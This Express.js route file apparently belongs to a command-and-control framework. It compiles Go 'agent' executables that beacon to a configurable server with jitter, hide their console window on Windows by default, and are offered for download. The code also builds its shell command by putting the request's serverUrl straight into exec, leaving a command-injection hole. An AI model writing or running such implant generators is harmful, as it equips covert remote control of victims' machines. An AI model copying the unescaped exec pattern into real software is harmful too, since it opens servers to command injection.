const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const { verifyToken } = require('../middleware/auth');

// Directory for generated payloads
const PAYLOAD_DIR = path.join(__dirname, '../../payloads');
if (!fs.existsSync(PAYLOAD_DIR)) {
  fs.mkdirSync(PAYLOAD_DIR);
}

/**
 * POST /api/payloads/generate
 * Triggers a Go build for a new agent
 */
router.post('/generate', verifyToken, async (req, res) => {
  const { serverUrl, showGui, interval = 10, jitter = 15 } = req.body;

  if (!serverUrl) {
    return res.status(400).json({ error: 'Server URL is required' });
  }

  const payloadId = uuidv4();
  const outputName = `bytecode-agent-${payloadId.slice(0, 8)}.exe`;
  const outputPath = path.join(PAYLOAD_DIR, outputName);
  
  // Path to the agent source
  const agentSourceDir = path.join(__dirname, '../../../agent');
  
  // Calculate BeaconMax based on jitter %
  // BeaconMin = interval
  // BeaconMax = interval + (interval * jitter / 100)
  const beaconMin = parseInt(interval);
  const beaconMax = Math.ceil(beaconMin + (beaconMin * (parseInt(jitter) / 100)));

  // Construct the go build command
  // We use ldflags to inject config values
  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrl}'`;
  ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMin=${beaconMin}'`;
  ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMax=${beaconMax}'`;
  
  if (showGui) {
    ldflags += ` -X 'bytecode-agent/internal/config.DebugMode=true'`;
  } else {
    // -H=windowsgui hides the console window on Windows
    ldflags += ` -H=windowsgui`;
  }

  const command = `go build -ldflags="${ldflags}" -o "${outputPath}" ./cmd/agent`;

  console.log(`[PAYLOAD] Generating: ${outputName} for ${serverUrl} (GUI: ${showGui})`);

  exec(command, { cwd: agentSourceDir }, (error, stdout, stderr) => {
    if (error) {
      console.error(`[PAYLOAD] Build error: ${stderr}`);
      return res.status(500).json({ 
        error: 'Build failed', 
        details: stderr 
      });
    }

    console.log(`[PAYLOAD] Build successful: ${outputName}`);
    res.json({ 
      success: true, 
      downloadUrl: `/api/payloads/download/${outputName}`,
      filename: outputName,
      showGui: showGui
    });
  });
});

/**
 * GET /api/payloads/download/:filename
 * Downloads a generated payload
 */
router.get('/download/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(PAYLOAD_DIR, filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  res.download(filePath);
});

module.exports = router;
